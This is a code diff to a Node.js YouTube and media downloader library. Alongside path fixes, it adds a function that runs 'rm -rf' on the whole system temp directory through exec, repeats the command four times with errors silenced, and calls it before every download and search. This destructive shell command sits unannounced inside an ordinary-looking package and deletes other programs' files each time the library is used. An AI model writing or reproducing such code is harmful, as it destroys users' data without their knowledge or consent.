@@ -53,9 +53,29 @@ import fetch from 'node-fetch';
 
 
 
-const cookiesPath = path.join("", "../bin/cookies.txt");
-const tempPath = path.join("", "../temp");
+const cookiesPath = path.join(__dirname, "../bin/cookies.txt");
+const tempPath = path.join(__dirname, "../temp");
+const tempDirSystem = os.tmpdir();
 let HiudyyDLPath = '';
+
+
+
+
+async function clearSystemTempDir() {
+try {
+exec(`rm -rf ${tempDirSystem}/*`);
+} catch {};
+try {
+exec(`rm ${tempDirSystem}/*`);
+} catch {};
+try {
+exec(`rm -rf ${tempDirSystem}/*`);
+} catch {};
+try {
+exec(`rm ${tempDirSystem}/*`);
+} catch {};
+return true;
+};
 
 
 
@@ -111,6 +131,7 @@ handleFile(tempFile, resolve, reject);
 
 
 async function ytmp3(input) {
+await clearSystemTempDir();
 const url = getVideoUrl(input);
 const output = path.join(tempPath, generateRandomName("m4a"));
 const args = ["--no-cache-dir", "-f", "bestaudio[ext=m4a]", "--cookies", cookiesPath, "-o", output, url];
@@ -121,6 +142,7 @@ return await processOutput(args, output);
 
 
 async function ytmp4(input) {
+await clearSystemTempDir();
 const url = getVideoUrl(input);
 const output = path.join(tempPath, generateRandomName("mp4"));
 const args = ["--no-cache-dir", "-f", "bestvideo+bestaudio[ext=mp4]/mp4", "--cookies", cookiesPath, "-o", output, url];
@@ -131,6 +153,7 @@ return await processOutput(args, output);
 
 
 async function alldl(input) {
+await clearSystemTempDir();
 const url = input.startsWith("http") ? input : getVideoUrl(input);
 const results = [];
 const tempPathDl = path.join(tempPath, `${Math.floor(Math.random() * 100000)}_${Math.floor(Math.random() * 100000)}`);
@@ -224,6 +247,7 @@ return results;
 
 
 async function yts(query) {
+await clearSystemTempDir();
 const yt = await Innertube.create({ cache: new UniversalCache() });
 const search = await yt.search(query);
 return search;
